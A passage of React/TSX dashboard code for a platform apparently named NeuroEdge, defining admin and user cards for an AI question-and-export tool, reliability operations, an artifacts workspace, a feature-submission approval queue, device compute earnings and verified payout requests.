                {h?.job_id ? <div style={muted}>job: {h.job_id}</div> : null}
              </div>
            ))
          )}
        </div>
      </div>
    </Card>
  );

  const cortexCoreCard = (
    <Card title="CortexCore Intelligence Engine">
      <div style={{ ...muted, marginBottom: 8 }}>
        Math/Physics/Science/Code/Research solving, graph/equation visualization, and academic exports (PDF/Word/ZIP).
      </div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={intelligenceQuestion}
          onChange={(e) => setIntelligenceQuestion(e.target.value)}
          placeholder="Ask CortexCore (e.g. differentiate x^2 + 2x, solve ohm law i=2 r=5, compare transformers vs rnns)"
          style={input}
        />
        <select value={intelligenceMode} onChange={(e) => setIntelligenceMode(e.target.value)} style={input}>
          <option value="step_by_step">step-by-step mode</option>
          <option value="fast">fast answer mode</option>
          <option value="deep_research">deep research mode</option>
          <option value="beginner">beginner explanation</option>
          <option value="advanced">advanced explanation</option>
          <option value="exam">exam mode (concise)</option>
        </select>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/ask", { question: intelligenceQuestion, mode: intelligenceMode, payload: {} });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Intelligence ask failed" });
              }
            }}
          >
            Ask Intelligence
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/platform", {
                  question: intelligenceQuestion || "Build full platform architecture for websites, databases, APIs, cloud and security.",
                  mode: intelligenceMode,
                  payload: { node_types: ["laptop", "desktop", "mobile"] },
                });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Platform intelligence failed" });
              }
            }}
          >
            Platform Intelligence
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/fullstack", {
                  question: intelligenceQuestion || "NeuroEdge full stack internet + offline mesh architecture",
                  mode: intelligenceMode,
                  payload: { include_mesh: true },
                });
                setIntelligenceOutput(data);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Fullstack blueprint failed" });
              }
            }}
          >
            Build Fullstack + Mesh
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/visualize", {
                  question: intelligenceQuestion,
                  payload: { type: intelligenceQuestion.includes("=") ? "equation" : "graph", x_min: -10, x_max: 10 },
                });
                setIntelligenceOutput(data);
                const svg = String(data?.visualization?.svg || "");
                setIntelligenceSvg(svg);
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Visualization failed" });
              }
            }}
          >
            Visualize Graph/Equation
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "pdf",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "PDF export failed" });
              }
            }}
          >
            Export PDF
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "word",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "Word export failed" });
              }
            }}
          >
            Export Word
          </button>
          <button
            style={chip}
            onClick={async () => {
              try {
                const data = await postJson("/intelligence/export", {
                  question: intelligenceQuestion,
                  payload: {
                    format: "zip",
                    title: "NeuroEdge Academic Report",
                    content: JSON.stringify(intelligenceOutput || { question: intelligenceQuestion }, null, 2),
                  },
                });
                setIntelligenceOutput(data);
                setIntelligenceExportPath(String(data?.export?.path || ""));
              } catch (err: any) {
                addNotification({ type: "error", message: err?.message || "ZIP export failed" });
              }
            }}
          >
            Export ZIP
          </button>
          {intelligenceExportPath ? (
            <button
              style={primary}
              onClick={() => window.open(`${apiBase}/intelligence/download?path=${encodeURIComponent(intelligenceExportPath)}`, "_blank")}
            >
              Download Export
            </button>
          ) : null}
        </div>
      </div>
      {intelligenceSvg ? (
        <div
          style={{ ...log, marginTop: 8 }}
          dangerouslySetInnerHTML={{ __html: intelligenceSvg }}
        />
      ) : null}
      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 220, overflow: "auto", marginTop: 8 }}>
        {intelligenceOutput ? JSON.stringify(intelligenceOutput, null, 2) : "No intelligence output yet."}
      </pre>
    </Card>
  );

  const reliabilityOpsCard = (
    <Card title="Reliability Ops (SLO • Canary • Incidents)">
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 8 }}>
        <button style={chip} onClick={refreshReliabilityProgram}>Refresh Program</button>
        <button style={chip} onClick={() => runBackendAction("GET:/admin/reliability/overview?windowHours=24")}>Reliability Snapshot</button>
        <button style={chip} onClick={() => runBackendAction("GET:/admin/sre/concurrency")}>Concurrency</button>
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(140px, 1fr))", gap: 8 }}>
        <Stat label="SLO Availability" value={`${reliabilityProgram?.slo?.availabilityPct ?? 99.9}%`} />
        <Stat label="SLO p95" value={`${reliabilityProgram?.slo?.p95LatencyMs ?? 2500}ms`} />
        <Stat label="Error Budget" value={`${reliabilityProgram?.slo?.errorBudgetPct ?? 0.1}%`} />
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>SLO Policy</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(180px, 1fr))", gap: 8 }}>
        <input value={sloDraft.availabilityPct} onChange={(e) => setSloDraft((p) => ({ ...p, availabilityPct: e.target.value }))} placeholder="Availability %" style={input} />
        <input value={sloDraft.p95LatencyMs} onChange={(e) => setSloDraft((p) => ({ ...p, p95LatencyMs: e.target.value }))} placeholder="p95 latency ms" style={input} />
        <input value={sloDraft.errorBudgetPct} onChange={(e) => setSloDraft((p) => ({ ...p, errorBudgetPct: e.target.value }))} placeholder="Error budget %" style={input} />
        <input value={sloDraft.windowDays} onChange={(e) => setSloDraft((p) => ({ ...p, windowDays: e.target.value }))} placeholder="Window days" style={input} />
        <input value={sloDraft.owner} onChange={(e) => setSloDraft((p) => ({ ...p, owner: e.target.value }))} placeholder="Owner" style={input} />
      </div>
      <button style={primary} onClick={saveSloProgram}>Save SLO</button>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Canary Rollout</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <input value={canaryTrafficPct} onChange={(e) => setCanaryTrafficPct(e.target.value)} placeholder="Canary traffic %" style={{ ...input, width: 180 }} />
        <button style={chip} onClick={() => setCanaryAutoRollback((v) => !v)}>
          Auto rollback: {canaryAutoRollback ? "on" : "off"}
        </button>
        <button style={primary} onClick={runCanaryNow}>Run Canary</button>
      </div>
      {reliabilityProgram?.canary?.lastRun && (
        <pre style={{ ...log, maxHeight: 180, overflow: "auto", marginTop: 8 }}>
          {JSON.stringify(reliabilityProgram.canary.lastRun, null, 2)}
        </pre>
      )}

      <div style={{ marginTop: 10, fontWeight: 700 }}>Status Page + Incident Queue</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <select value={statusPageMode} onChange={(e) => setStatusPageMode(e.target.value as any)} style={input}>
          <option value="operational">operational</option>
          <option value="degraded">degraded</option>
          <option value="major_outage">major_outage</option>
          <option value="maintenance">maintenance</option>
        </select>
        <input value={statusPageMessage} onChange={(e) => setStatusPageMessage(e.target.value)} placeholder="Status page message" style={{ ...input, minWidth: 280 }} />
        <button style={chip} onClick={updateStatusPage}>Update Status Page</button>
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <input value={incidentTitle} onChange={(e) => setIncidentTitle(e.target.value)} placeholder="Incident title" style={input} />
        <select value={incidentSeverity} onChange={(e) => setIncidentSeverity(e.target.value as any)} style={input}>
          <option value="sev1">sev1</option>
          <option value="sev2">sev2</option>
          <option value="sev3">sev3</option>
          <option value="sev4">sev4</option>
        </select>
        <input value={incidentSummary} onChange={(e) => setIncidentSummary(e.target.value)} placeholder="Incident summary" style={{ ...input, minWidth: 280 }} />
        <button style={chip} onClick={createReliabilityIncident}>Create Incident</button>
      </div>
      <div style={{ marginTop: 8, maxHeight: 180, overflowY: "auto", display: "grid", gap: 6 }}>
        {(reliabilityProgram?.incidents || []).slice(0, 12).map((inc) => (
          <div key={inc.id} style={log}>
            {inc.id} • {inc.severity} • {inc.status} • {inc.title}
          </div>
        ))}
      </div>
    </Card>
  );

  const artifactWorkspaceCard = (
    <Card title="Artifacts Workspace (Build • Edit • Share)">
      <div style={{ ...muted, marginBottom: 8 }}>
        Collaborative lightweight workspace for plans, docs, code snippets, and reports similar to artifact-style workflows.
      </div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={artifactDraft.title}
          onChange={(e) => setArtifactDraft((p) => ({ ...p, title: e.target.value }))}
          placeholder="Artifact title"
          style={input}
        />
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <select value={artifactDraft.type} onChange={(e) => setArtifactDraft((p) => ({ ...p, type: e.target.value as any }))} style={input}>
            <option value="doc">doc</option>
            <option value="code">code</option>
            <option value="plan">plan</option>
            <option value="report">report</option>
          </select>
          <select value={artifactDraft.visibility} onChange={(e) => setArtifactDraft((p) => ({ ...p, visibility: e.target.value as any }))} style={input}>
            <option value="private">private</option>
            <option value="workspace">workspace</option>
          </select>
          <button style={primary} onClick={createArtifact}>Save Artifact</button>
        </div>
        <textarea
          value={artifactDraft.body}
          onChange={(e) => setArtifactDraft((p) => ({ ...p, body: e.target.value }))}
          placeholder="Write artifact content here..."
          style={{ ...input, minHeight: 120 }}
        />
      </div>
      <div style={{ marginTop: 8, display: "grid", gap: 8, maxHeight: 240, overflowY: "auto" }}>
        {artifactWorkspace.map((a) => (
          <div key={a.id} style={{ ...log, whiteSpace: "pre-wrap" }}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "center" }}>
              <strong>{a.title}</strong>
              <span>{a.type} • {a.visibility}</span>
            </div>
            <div style={{ ...muted, marginTop: 4 }}>owner: {a.owner} • updated: {new Date(a.updatedAt).toLocaleString()}</div>
            <div style={{ marginTop: 6, maxHeight: 90, overflowY: "auto" }}>{a.body}</div>
            <div style={{ marginTop: 6, display: "flex", gap: 6 }}>
              <button style={chip} onClick={() => navigator.clipboard?.writeText(a.body)}>Copy</button>
              <button style={chip} onClick={() => setArtifactDraft({ title: a.title, type: a.type, body: a.body, visibility: a.visibility })}>Load to Editor</button>
              <button style={chip} onClick={() => deleteArtifact(a.id)}>Delete</button>
            </div>
          </div>
        ))}
        {artifactWorkspace.length === 0 && <div style={muted}>No artifacts yet. Create your first artifact.</div>}
      </div>
    </Card>
  );

  const neuroExpansionBuilderCard = (
    <Card title="NeuroExpansion & Building">
      <div style={muted}>
        Founder/Admin/Dev can submit feature specs + code snippets. Twin-style security screening runs first
        (malware/prompt-injection/doctrine), then approval + controlled merge artifact generation with audit logs.
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <button style={chip} onClick={refreshNeuroExpansion}>Refresh</button>
        <button style={chip} onClick={scanPlaceholderGapsNow}>Scan Placeholders</button>
        <button style={chip} onClick={runNeuroExpansionDailyNow}>Run Daily Planner</button>
        <button style={chip} onClick={() => runBackendAction("GET:/self-expansion/analyze")}>Twin Analyze (System)</button>
      </div>

      <div style={{ marginTop: 8, fontWeight: 700 }}>Planner Settings</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(160px, 1fr))", gap: 8 }}>
        <label style={chip}>
          <input
            type="checkbox"
            checked={neuroExpansionSettingsDraft.enabled}
            onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, enabled: e.target.checked }))}
            style={{ marginRight: 6 }}
          />
          Enabled
        </label>
        <label style={chip}>
          <input
            type="checkbox"
            checked={neuroExpansionSettingsDraft.autoDailyScan}
            onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, autoDailyScan: e.target.checked }))}
            style={{ marginRight: 6 }}
          />
          Auto Daily Scan
        </label>
        <label style={chip}>
          <input
            type="checkbox"
            checked={neuroExpansionSettingsDraft.requireFounderApproval}
            onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, requireFounderApproval: e.target.checked }))}
            style={{ marginRight: 6 }}
          />
          Require Founder Approval
        </label>
        <label style={chip}>
          <input
            type="checkbox"
            checked={neuroExpansionSettingsDraft.autoTestOnMerge}
            onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, autoTestOnMerge: e.target.checked }))}
            style={{ marginRight: 6 }}
          />
          Auto-Test on Merge
        </label>
        <input
          value={neuroExpansionSettingsDraft.placeholderScanRoots}
          onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, placeholderScanRoots: e.target.value }))}
          placeholder="Scan roots: src,../frontend/src,../ml"
          style={{ ...input, gridColumn: "span 2" }}
        />
        <input
          value={neuroExpansionSettingsDraft.maxFindings}
          onChange={(e) => setNeuroExpansionSettingsDraft((p) => ({ ...p, maxFindings: e.target.value }))}
          placeholder="Max findings"
          style={input}
        />
        <button style={primary} onClick={saveNeuroExpansionSettingsNow}>Save Settings</button>
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Submit Feature / Code for Twin Review</div>
      <div style={{ display: "grid", gap: 8 }}>
        <input
          value={neuroExpansionTitle}
          onChange={(e) => setNeuroExpansionTitle(e.target.value)}
          placeholder="Feature title"
          style={input}
        />
        <textarea
          value={neuroExpansionFeature}
          onChange={(e) => setNeuroExpansionFeature(e.target.value)}
          placeholder="Describe feature, user need, expected outcome, rollout plan..."
          style={{ ...input, minHeight: 90 }}
        />
        <textarea
          value={neuroExpansionCode}
          onChange={(e) => setNeuroExpansionCode(e.target.value)}
          placeholder="Optional code snippet / patch proposal"
          style={{ ...input, minHeight: 110, fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace" }}
        />
        <button style={primary} onClick={submitNeuroExpansionNow}>Submit to NeuroExpansion Queue</button>
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Approval + Merge Queue</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(160px, 1fr))", gap: 8 }}>
        <label style={chip}>
          <input
            type="checkbox"
            checked={neuroExpansionPatchRunTests}
            onChange={(e) => setNeuroExpansionPatchRunTests(e.target.checked)}
            style={{ marginRight: 6 }}
          />
          Run Tests on Patch Apply
        </label>
        <input
          value={neuroExpansionPatchTestCommand}
          onChange={(e) => setNeuroExpansionPatchTestCommand(e.target.value)}
          placeholder="Test command (e.g. pnpm run typecheck)"
          style={input}
        />
        <input
          value={neuroExpansionPrBaseBranch}
          onChange={(e) => setNeuroExpansionPrBaseBranch(e.target.value)}
          placeholder="PR base branch"
          style={input}
        />
        <div style={{ display: "flex", gap: 8 }}>
          <label style={chip}>
            <input
              type="checkbox"
              checked={neuroExpansionPrMaterialize}
              onChange={(e) => setNeuroExpansionPrMaterialize(e.target.checked)}
              style={{ marginRight: 6 }}
            />
            Materialize Branch+Commit
          </label>
          <label style={chip}>
            <input
              type="checkbox"
              checked={neuroExpansionPrPush}
              onChange={(e) => setNeuroExpansionPrPush(e.target.checked)}
              style={{ marginRight: 6 }}
            />
            Auto Push
          </label>
        </div>
      </div>
      <input
        value={neuroExpansionReviewReason}
        onChange={(e) => setNeuroExpansionReviewReason(e.target.value)}
        placeholder="Review reason (optional)"
        style={input}
      />
      <div style={{ marginTop: 8, display: "grid", gap: 8, maxHeight: 280, overflowY: "auto" }}>
        {(neuroExpansion?.submissions || []).slice(0, 30).map((s) => (
          <div key={s.id} style={{ ...log, whiteSpace: "pre-wrap" }}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, flexWrap: "wrap" }}>
              <strong>{s.title}</strong>
              <span>
                {s.status} • severity: {s.scan?.severity}
              </span>
            </div>
            <div style={muted}>
              by {s.metadata?.uploadedBy || "unknown"} ({s.metadata?.uploadedByRole || "unknown"}) •{" "}
              {s.metadata?.uploadedAt ? new Date(s.metadata.uploadedAt).toLocaleString() : "-"}
            </div>
            <div style={{ marginTop: 4 }}>{s.featureText}</div>
            {Array.isArray(s.scan?.signals) && s.scan.signals.length > 0 && (
              <div style={{ ...muted, marginTop: 4 }}>signals: {s.scan.signals.join(", ")}</div>
            )}
            <div style={{ marginTop: 6, display: "flex", gap: 6, flexWrap: "wrap" }}>
              {(dashboardRole === "founder" || dashboardRole === "admin") && s.status === "pending_approval" && (
                <>
                  <button style={primary} onClick={() => reviewNeuroExpansionNow(s.id, "approve")}>Approve</button>
                  <button style={chip} onClick={() => reviewNeuroExpansionNow(s.id, "reject")}>Reject</button>
                </>
              )}
              {(dashboardRole === "founder" || dashboardRole === "admin") && s.status === "approved" && (
                <>
                  <button style={primary} onClick={() => mergeNeuroExpansionNow(s.id)}>Merge</button>
                  <button style={chip} onClick={() => previewNeuroExpansionPatchNow(s.id)}>Diff Preview</button>
                  <button style={chip} onClick={() => applyNeuroExpansionPatchNow(s.id)}>Apply Patch</button>
                  <button style={chip} onClick={() => generateNeuroExpansionPrNow(s.id)}>Generate PR Draft</button>
                </>
              )}
              {(dashboardRole === "developer" || dashboardRole === "admin" || dashboardRole === "founder") &&
                s.status !== "blocked" &&
                s.status !== "approved" && (
                  <button style={chip} onClick={() => previewNeuroExpansionPatchNow(s.id)}>Diff Preview</button>
                )}
              {s.merge?.targetPath && <span style={muted}>merged artifact: {s.merge.targetPath}</span>}
            </div>
          </div>
        ))}
        {(!neuroExpansion?.submissions || neuroExpansion.submissions.length === 0) && (
          <div style={muted}>No submissions yet.</div>
        )}
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Auto Proposals (Daily Gap Planner)</div>
      <div style={{ display: "grid", gap: 6, maxHeight: 180, overflowY: "auto" }}>
        {(neuroExpansion?.autoProposals || []).slice(0, 12).map((p) => (
          <div key={p.id} style={log}>
            {p.id} • placeholders: {p.placeholdersDetected} • {p.status}
          </div>
        ))}
        {(!neuroExpansion?.autoProposals || neuroExpansion.autoProposals.length === 0) && (
          <div style={muted}>No auto proposals yet.</div>
        )}
      </div>

      <div style={{ marginTop: 10, fontWeight: 700 }}>Founder/Admin Fanout Notifications</div>
      <div style={{ display: "grid", gap: 6, maxHeight: 160, overflowY: "auto" }}>
        {neuroExpansionNotifications.slice(0, 20).map((n) => (
          <div key={n.id} style={log}>
            {new Date(Number(n.createdAt || Date.now())).toLocaleString()} • {n.title}: {n.message}
          </div>
        ))}
        {neuroExpansionNotifications.length === 0 && (
          <div style={muted}>No fanout notifications yet.</div>
        )}
      </div>

      <pre style={{ ...log, whiteSpace: "pre-wrap", maxHeight: 180, overflow: "auto", marginTop: 8 }}>
        {neuroExpansionPlaceholderReport
          ? JSON.stringify(neuroExpansionPlaceholderReport, null, 2)
          : "No placeholder scan report yet."}
      </pre>
    </Card>
  );

  const ownerComputeCard = (
    <Card title="My Compute Devices & Earnings">
      <div style={muted}>
        NeuroEdge uses your device in background-safe mode with resource guardrails to avoid freeze, overheating, or shutdown risk.
      </div>
      <div style={{ ...log, marginTop: 8 }}>
        Guardrails: CPU {Number(ownerGuardrails.maxCpuPct || 0)}% • RAM {Number(ownerGuardrails.maxRamPct || 0)}% •
        Temp pause {Number(ownerGuardrails.pauseOnHighTempC || 0)}C • Battery pause{" "}
        {ownerGuardrails.pauseOnBattery ? "on" : "off"}
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <button style={chip} onClick={refreshOwnerCompute}>Refresh</button>
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(120px, 1fr))", gap: 8, marginTop: 8 }}>
        <Stat label="My Devices" value={String(ownerComputeDevices.length)} />
        <Stat label="Wallet Points" value={String(Number(ownerWallet?.points || 0).toLocaleString())} />
        <Stat label="Pending Cash" value={`$${Number(ownerWallet?.pendingCashUsd || 0).toFixed(2)}`} />
      </div>
      <div style={{ marginTop: 10, fontWeight: 700 }}>Add / Activate Device</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, minmax(140px, 1fr))", gap: 8 }}>
        <input value={computeDeviceDraft.id} onChange={(e) => setComputeDeviceDraft((p) => ({ ...p, id: e.target.value }))} placeholder="Device ID (optional)" style={input} />
        <input value={computeDeviceDraft.hostname} onChange={(e) => setComputeDeviceDraft((p) => ({ ...p, hostname: e.target.value }))} placeholder="Hostname" style={input} />
        <input value={computeDeviceDraft.os} onChange={(e) => setComputeDeviceDraft((p) => ({ ...p, os: e.target.value }))} placeholder="OS" style={input} />
      </div>
      <button style={primary} onClick={upsertOwnerComputeDevice}>Add / Update Device</button>

      <div style={{ marginTop: 10, maxHeight: 240, overflowY: "auto", display: "grid", gap: 8 }}>
        {ownerComputeDevices.length === 0 && <div style={muted}>No compute devices registered yet.</div>}
        {ownerComputeDevices.map((d) => (
          <div key={d.id} style={log}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8 }}>
              <strong>{d.hostname} ({d.id})</strong>
              <span>{d.status}</span>
            </div>
            {["paused", "throttled"].includes(String(d.status || "").toLowerCase()) && (
              <div
                style={{
                  marginTop: 6,
                  marginBottom: 6,
                  padding: "8px 10px",
                  borderRadius: 10,
                  border: "1px solid rgba(245, 158, 11, 0.45)",
                  background:
                    String(d.pauseReason || "").includes("high_temp")
                      ? "rgba(239, 68, 68, 0.16)"
                      : "rgba(245, 158, 11, 0.16)",
                  color: "var(--text)",
                  fontSize: 12,
                  fontWeight: 600,
                }}
              >
                {String(d.pauseReason || "").includes("high_temp")
                  ? "Thermal Alert: Device auto-paused due to high temperature."
                  : String(d.pauseReason || "").includes("battery")
                    ? "Power Alert: Device auto-paused while on battery."
                    : "Resource Alert: Device auto-throttled due to CPU/RAM guardrails."}
              </div>
            )}
            <div>CPU: {Number(d?.stats?.cpuPct || 0)}% • RAM: {Number(d?.stats?.ramPct || 0)}% • Temp: {Number(d?.stats?.tempC || 0)}C</div>
            <div>Tasks: {Number(d?.stats?.tasksCompleted || 0)} • Hours: {Number(d?.stats?.computeHours || 0)} • Earned: ${Number(d?.stats?.earningsUsd || 0).toFixed(2)}</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(80px, 1fr))", gap: 6, marginTop: 6 }}>
              <input
                value={telemetryDraftFor(d).cpuPct}
                onChange={(e) => updateTelemetryDraft(d.id, { cpuPct: e.target.value })}
                placeholder="CPU %"
                style={input}
              />
              <input
                value={telemetryDraftFor(d).ramPct}
                onChange={(e) => updateTelemetryDraft(d.id, { ramPct: e.target.value })}
                placeholder="RAM %"
                style={input}
              />
              <input
                value={telemetryDraftFor(d).tempC}
                onChange={(e) => updateTelemetryDraft(d.id, { tempC: e.target.value })}
                placeholder="Temp C"
                style={input}
              />
              <label style={{ ...muted, display: "flex", alignItems: "center", gap: 6 }}>
                <input
                  type="checkbox"
                  checked={telemetryDraftFor(d).onBattery}
                  onChange={(e) => updateTelemetryDraft(d.id, { onBattery: e.target.checked })}
                />
                On battery
              </label>
            </div>
            <div style={{ display: "flex", gap: 6, flexWrap: "wrap", marginTop: 6 }}>
              <button style={primary} onClick={() => submitDeviceTelemetry(d)}>Update Telemetry</button>
              <button style={chip} onClick={() => ownerDeviceAction(d.id, "pause")}>Pause</button>
              <button style={chip} onClick={() => ownerDeviceAction(d.id, "resume")}>Resume</button>
              <button style={chip} onClick={() => ownerDeviceAction(d.id, "suspend")}>Suspend</button>
              <button style={chip} onClick={() => ownerDeviceAction(d.id, "delete")}>Delete</button>
            </div>
          </div>
        ))}
      </div>
    </Card>
  );

  const ownerPayoutCard = (
    <Card title="My Payout Details & Requests (Verified)">
      <div style={muted}>Editing payout details requires verification to prevent theft.</div>
      <div style={{ marginTop: 8, display: "flex", gap: 8, flexWrap: "wrap" }}>
        <select value={ownerPaymentDraft.paymentMethod} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, paymentMethod: e.target.value }))} style={input}>
          <option value="bank">bank</option>
          <option value="card">card</option>
          <option value="wdc_wallet">wdc_wallet</option>
        </select>
        <input value={ownerPaymentDraft.bankName} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, bankName: e.target.value }))} placeholder="Bank Name" style={input} />
        <input value={ownerPaymentDraft.accountName} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, accountName: e.target.value }))} placeholder="Account Name" style={input} />
        <input value={ownerPaymentDraft.accountNumberMasked} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, accountNumberMasked: e.target.value }))} placeholder="Account Number (masked)" style={input} />
        <input value={ownerPaymentDraft.swiftCode} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, swiftCode: e.target.value }))} placeholder="SWIFT/BIC" style={input} />
        <input value={ownerPaymentDraft.cardHolder} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, cardHolder: e.target.value }))} placeholder="Card Holder" style={input} />
        <input value={ownerPaymentDraft.cardLast4} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, cardLast4: e.target.value }))} placeholder="Card last 4" style={input} />
        <input value={ownerPaymentDraft.billingCountry} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, billingCountry: e.target.value }))} placeholder="Billing Country" style={input} />
        <input value={ownerPaymentDraft.wdcWalletAddress} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, wdcWalletAddress: e.target.value }))} placeholder="WDC Wallet Address" style={input} />
        <input value={ownerPaymentDraft.neuroChainAddress} onChange={(e) => setOwnerPaymentDraft((p) => ({ ...p, neuroChainAddress: e.target.value }))} placeholder="NeuroChain Address" style={input} />
      </div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginTop: 8 }}>
        <select value={otpChannel} onChange={(e) => setOtpChannel(e.target.value as "email" | "sms")} style={input}>
          <option value="email">email</option>
          <option value="sms">sms</option>
        </select>
        <input
          value={otpDestination}
          onChange={(e) => setOtpDestination(e.target.value)}
          placeholder={otpChannel === "sms" ? "Phone (e.g +254...)" : "Email destination"}
          style={input}
        />
        <button style={chip} onClick={requestPaymentVerify}>Request Verification Code</button>
        <input value={paymentVerifyChallengeId} onChange={(e) => setPaymentVerifyChallengeId(e.target.value)} placeholder="Challenge ID" style={input} />
        <input value={paymentVerifyCode} onChange={(e) => setPaymentVerifyCode(e.target.value)} placeholder="Verification Code" style={input} />
        <button style={primary} onClick={saveOwnerPaymentVerified}>Verify & Save Details</button>
      </div>
      <div style={{ ...muted, marginTop: 6 }}>
        Verified profile: {ownerPayoutProfile?.verifiedAt ? new Date(ownerPayoutProfile.verifiedAt).toLocaleString() : "not verified yet"}
      </div>
      <div style={{ marginTop: 10, fontWeight: 700 }}>Request Payout</div>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <select value={payoutReqTarget} onChange={(e) => setPayoutReqTarget(e.target.value as any)} style={input}>
          <option value="cash">cash</option>
          <option value="wdc">wdc</option>
          <option value="points">points</option>
        </select>
        <input value={payoutReqUsd} onChange={(e) => setPayoutReqUsd(e.target.value)} placeholder="Amount USD" style={input} />
        <input value={payoutReqWdc} onChange={(e) => setPayoutReqWdc(e.target.value)} placeholder="Amount WDC" style={input} />
        <input value={payoutReqPoints} onChange={(e) => setPayoutReqPoints(e.target.value)} placeholder="Points" style={input} />
        <button style={primary} onClick={requestOwnerPayout}>Submit Payout Request</button>
      </div>
      <div style={{ marginTop: 8, maxHeight: 180, overflowY: "auto", display: "grid", gap: 6 }}>
        {ownerPayoutRequests.length === 0 && <div style={muted}>No payout requests yet.</div>}
        {ownerPayoutRequests.map((r) => (
          <div key={r.id} style={log}>
            {r.id} • {r.status} • ${Number(r.amountUsd || 0).toFixed(2)} • {Number(r.amountWdc || 0).toFixed(6)} WDC • {Number(r.points || 0)} pts
          </div>
        ))}
      </div>
    </Card>
  );

  const computePayoutAdminCard = (
    <Card title="Compute Payout Budget & Approvals" wide>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        <button style={chip} onClick={refreshComputePayoutsAdmin}>Refresh</button>
        <button style={primary} onClick={saveComputeBudget}>Save Budget</button>
      </div>
      <div style={{ marginTop: 10, fontWeight: 700 }}>Auto Payout Scheduler</div>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(180px, 1fr))", gap: 8, marginTop: 6 }}>
        <label style={{ ...muted, display: "flex", alignItems: "center", gap: 6 }}>
          <input
            type="checkbox"
            checked={Boolean(computeAutoPayoutConfig.enabled)}
            onChange={(e) => setComputeAutoPayoutConfig((p) => ({ ...p, enabled: e.target.checked }))}
          />
          Enabled
        </label>
        <select
          value={computeAutoPayoutConfig.period}
          onChange={(e) =>
            setComputeAutoPayoutConfig((p) => ({
              ...p,
              period: e.target.value as ComputeAutoPayoutConfig["period"],
            }))
          }
          style={{ ...input, minWidth: 0 }}
        >
          <option value="hourly">hourly</option>
          <option value="daily">daily</option>
          <option value="weekly">weekly</option>
          <option value="monthly">monthly</option>
        </select>
        <input
          value={String(computeAutoPayoutConfig.maxPayoutsPerRun || 200)}
          onChange={(e) =>
            setComputeAutoPayoutConfig((p) => ({ ...p, maxPayoutsPerRun: Number(e.target.value) || 1 }))
          }
          placeholder="Max payouts / run"
          style={{ ...input, minWidth: 0 }}
        />
        <button style={primary} onClick={saveComputePayoutScheduler}>Save Scheduler</button>
      </div>
      <div style={muted}>
        Last run:{" "}
